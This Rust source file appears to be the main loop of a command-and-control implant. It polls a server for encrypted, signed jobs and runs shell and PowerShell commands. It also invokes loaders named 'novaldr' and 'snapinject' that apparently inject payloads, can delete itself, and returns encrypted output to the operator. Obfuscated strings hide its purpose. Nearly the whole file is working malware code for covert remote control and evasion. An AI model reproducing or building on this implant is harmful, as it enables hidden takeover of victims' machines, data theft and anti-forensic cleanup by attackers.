use crate::{config::*, error::Error};
use crate::loaders::{novaldr, snapldr};
use crate::sys;
//use crate::updater::{self, full_update};
use crate::self_delete::self_delete;

use obfstr::obfstr as m;


use chacha20poly1305::{
    aead::{Aead,KeyInit}, Key,
    XChaCha20Poly1305,
};
//use blake2::{Blake2b512, Digest};
use blake3;


use common::{
    api::{self, AgentJob, JobPayload, UpdateJobResult},
    crypto,
};
use ed25519_dalek::{Signature, Verifier};
use ed25519_dalek::Signer;
use rand::RngCore;
use std::convert::TryFrom;
use std::{thread::sleep, time::Duration};
use uuid::Uuid;
use x25519_dalek::x25519;
use zeroize::Zeroize;

pub fn run(api_client: &ureq::Agent, conf: Config) -> ! {
    let sleep_for = Duration::from_secs(1);
    let get_job_route = format!("{}/api/agents/{}/job", SERVER_URL, conf.agent_id);
    let post_job_result_route = format!("{}/api/jobs/result", SERVER_URL);

    loop {
        let server_res = match api_client.get(get_job_route.as_str()).call() {
            Ok(res) => res,
            Err(err) => {
                log::debug!("Error geeting job from server: {}", err);
                sleep(sleep_for);
                continue;
            }
        };

        let api_res: api::Response<api::AgentJob> = match server_res.into_json() {
            Ok(res) => res,
            Err(err) => {
                log::debug!("Error parsing JSON: {}", err);
                sleep(sleep_for);
                continue;
            }
        };

        log::debug!("API response successfully received");

        let encrypted_job = match api_res.data {
            Some(job) => job,
            None => {
                log::debug!("No job found. Trying again in: {:?}", sleep_for);
                sleep(sleep_for);
                continue;
            }
        };

        let (job_id, job) = match decrypt_and_verify_job(&conf, encrypted_job) {
            Ok(res) => res,
            Err(err) => {
                log::debug!("Error decrypting job: {}", err);
                sleep(sleep_for);
                continue;
            }
        };

        let output = execute_command(job.command);

        let job_result = match encrypt_and_sign_job_result(
            &conf,
            job_id,
            output,
            job.result_ephemeral_public_key,
        ) {
            Ok(res) => res,
            Err(err) => {
                log::debug!("Error encrypting job result: {}", err);
                sleep(sleep_for);
                continue;
            }
        };

        match api_client
            .post(post_job_result_route.as_str())
            .send_json(ureq::json!(job_result))
        {
            Ok(_) => {}
            Err(err) => {
                log::debug!("Error sending job's result back: {}", err);
            }
        };
    }
}


//Dummy command
fn whoami() -> String {
   "user".to_string()
}


fn execute_command(command: String) -> String {
    let mut ret = String::new();

    //output to execute custom commands
    let args_split = command.as_str().split(' ');
    let args = args_split.collect::<Vec<&str>>();

    let custom_output = match args[0] {
        "whoami" => whoami(), //dummy command, remove this
        "cmd" => sys::cmd::cmd_command(args),
        "novaldr" => {
            match novaldr::novamain(args.iter().map(|&s| s.to_string()).collect()) {
                Ok(_) => {
                    log::debug!("Novaldr executed successfully");
                    return m!("Novaldr executed successfully").to_string();
                }
                Err(err) => {
                    log::debug!("Error executing Novaldr: {}", err);
                    return m!("Error executing Novaldr").to_string();
                }
            }
        }
        "selfdelete" => {
            match self_delete() {
                Ok(_) => {
                    log::debug!("Self delete executed successfully");
                    return m!("Self delete executed successfully").to_string();
                }
                Err(err) => {
                    log::debug!("Error executing self delete: {}", err);
                    return m!("Error executing self delete").to_string();
                }
            }
        }
        "powershell" => {
            match sys::powershell::execute_powershell(args.iter().map(|&s| s.to_string()).collect()) {
                Ok(_) => {
                    log::debug!("Powershell executed successfully");
                    return m!("Powershell executed successfully").to_string();
                }
                Err(err) => {
                    log::debug!("Error executing powershell: {}", err);
                    return m!("Error executing powershell").to_string();
                }
            }
        }
        "snapinject" => {
            match snapldr::snap_inject(args.iter().map(|&s| s.to_string()).collect()) {
                Ok(_) => {
                    log::debug!("Snap injected successfully");
                    return m!("Snap injected successfully").to_string();
                }
                Err(err) => {
                    log::debug!("Error injecting snap: {}", err);
                    return m!("Error injecting snap").to_string();
                }
            }
        }
        






       _ => {
           log::debug!("Command not found: {}", command);
           return ret;
       }
    };

    ret = custom_output;

    return ret;

}

fn decrypt_and_verify_job(conf: &Config, job: AgentJob) -> Result<(Uuid, JobPayload), Error> {

    //verify input
    if job.signature.len() != crypto::ED25519_SIGNATURE_SIZE {
        return Err(Error::Internal(
            "Job's signature size is not valid".to_string(),
        ));
    }

    
    // verify job_id, agent_id, encrypted_job, ephemeral_public_key, nonce
    let mut buffer_to_verify = job.id.as_bytes().to_vec();
    buffer_to_verify.append(&mut conf.agent_id.as_bytes().to_vec());
    buffer_to_verify.append(&mut job.encrypted_job.clone());
    buffer_to_verify.append(&mut job.ephemeral_public_key.to_vec());
    buffer_to_verify.append(&mut job.nonce.to_vec());

    log::debug!("Buffer to verify: {:?}", buffer_to_verify);

    let signature = ed25519_dalek::Signature::try_from(&job.signature[0..64])?;

    log::debug!("Signature: {:?}", signature);

    if conf
        .client_identity_public_key
        .verify(&buffer_to_verify, &signature)
        .is_err()
    {
        return Err(Error::Internal("Agent's prekey signature is not valid".to_string()));
    }    

        //key exchange
        let mut shared_secret = x25519(
            conf.private_prekey,
            job.ephemeral_public_key,
        );

        //derive the symmetric key
        //let mut hasher = Blake2b512::new();
        let mut hasher = blake3::Hasher::new();
        hasher.update(&shared_secret);

        //optional context for domain separation
        hasher.update(b"symmetric_key");
        let derived_key = hasher.finalize();
        let derived_key_bytes = derived_key.as_bytes();

        //take the first 32 bytes as the key
        let mut key = Key::clone_from_slice(&derived_key_bytes[..32]);

        //decrypt the job
        let cipher = XChaCha20Poly1305::new(&key);

        let decrypted_job_bytes = cipher.decrypt((&job.nonce).into(), job.encrypted_job.as_ref())?;

        shared_secret.zeroize();
        key.zeroize();

        //deserialize the decrypted job
        let job_payload: api::JobPayload = serde_json::from_slice(&decrypted_job_bytes)?;

        Ok((job.id, job_payload))
    
}

fn encrypt_and_sign_job_result(
    conf: &Config,
    job_id: Uuid,
    output: String,
    job_result_ephemeral_public_key: [u8; crypto::X25519_PUBLIC_KEY_SIZE],
) -> Result<UpdateJobResult, Error> {

    let mut rand_generator = rand::rngs::OsRng {};

    // generate ephemeral keypair for job result encryption
    let mut ephemeral_private_key = [0u8; crypto::X25519_PRIVATE_KEY_SIZE];
    rand_generator.fill_bytes(&mut ephemeral_private_key);

    let ephemeral_public_key = x25519(
        ephemeral_private_key.clone(),
        x25519_dalek::X25519_BASEPOINT_BYTES,
    );

    // key exchange
    let mut shared_secret = x25519(
        ephemeral_private_key,
        job_result_ephemeral_public_key,
    );

    //nonce
    let mut nonce = [0u8; crypto::XCHACHA20_POLY1305_NONCE_SIZE];
    rand_generator.fill_bytes(&mut nonce);

    //derive the symmetric key
    //let mut hasher = Blake2b512::new();
    let mut hasher = blake3::Hasher::new();
    hasher.update(&shared_secret);

    //optional context for domain separation
    hasher.update(b"symmetric_key");

    let derived_key = hasher.finalize();
    let derived_key_bytes = derived_key.as_bytes();

    //take the first 32 bytes as the key
    let mut key = Key::clone_from_slice(&derived_key_bytes[..32]);

    //serialize the job result
    let job_result_payload = api::JobResult {
        output,
    };
    let job_result_payload_json = serde_json::to_vec(&job_result_payload)?;

    //encrypt the job result
    let cipher = XChaCha20Poly1305::new(&key);
    let encrypted_job_result = cipher.encrypt(&nonce.into(), job_result_payload_json.as_ref())?;

    shared_secret.zeroize();
    key.zeroize();

    //sign stuff
    let mut buffer_to_sign = job_id.as_bytes().to_vec();
    buffer_to_sign.append(&mut conf.agent_id.as_bytes().to_vec());
    buffer_to_sign.append(&mut encrypted_job_result.clone());
    buffer_to_sign.append(&mut ephemeral_public_key.to_vec());
    buffer_to_sign.append(&mut nonce.to_vec());

    //convert SigningKey to [u8, 32]
    log::debug!("Buffer to sign: {:?}", buffer_to_sign);


    let identity = ed25519_dalek::SigningKey::from_bytes(&conf.identity_private_key.to_bytes());

    let signature: Signature = identity.sign(&buffer_to_sign);

    log::debug!("Signature: {:?}", signature);

    Ok(UpdateJobResult {
        job_id,
        encrypted_job_result,
        ephemeral_public_key,
        nonce,
        signature: signature.to_bytes().to_vec(),
    })

}